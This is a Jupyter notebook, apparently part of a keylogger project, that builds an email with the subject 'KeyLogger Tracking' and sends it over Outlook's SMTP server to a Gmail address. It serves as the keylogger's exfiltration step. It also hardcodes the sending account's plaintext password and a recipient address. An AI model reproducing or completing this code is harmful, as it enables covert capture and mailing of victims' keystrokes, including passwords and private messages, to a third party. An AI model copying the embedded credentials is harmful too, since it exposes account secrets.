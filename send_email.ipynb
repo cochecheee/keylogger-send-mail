{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Import libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import smtplib\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.multipart import MIMEMultipart"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Sender hotmail"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "user = \"testsmtplib.123@outlook.com\"\n",
    "passwd = \"Hellomaycung@312@@123#*\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Receiver Mail"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "from_addr = \"testsmtplib.123@outlook.com\"\n",
    "to_addr = \"buitien747@gmail.com\"\n",
    "smtp_srv = \"smtp.live.com\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Send mail"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_mail(message):\n",
    "    # create a mail\n",
    "    msg = MIMEMultipart()\n",
    "    msg['From'] = from_addr\n",
    "    msg['To'] = to_addr\n",
    "    msg['Subject'] = \"KeyLogger Tracking\"\n",
    "\n",
    "    # attach body with message\n",
    "    msg.attach(MIMEText(message, 'plain'))\n",
    "\n",
    "    # connect to the server and send the email\n",
    "    with smtplib.SMTP('smtp-mail.outlook.com', 587) as connection:\n",
    "        connection.starttls() \n",
    "        connection.login(user=user, password=passwd)\n",
    "        connection.sendmail(from_addr=from_addr, to_addrs=to_addr, msg=msg.as_string())\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
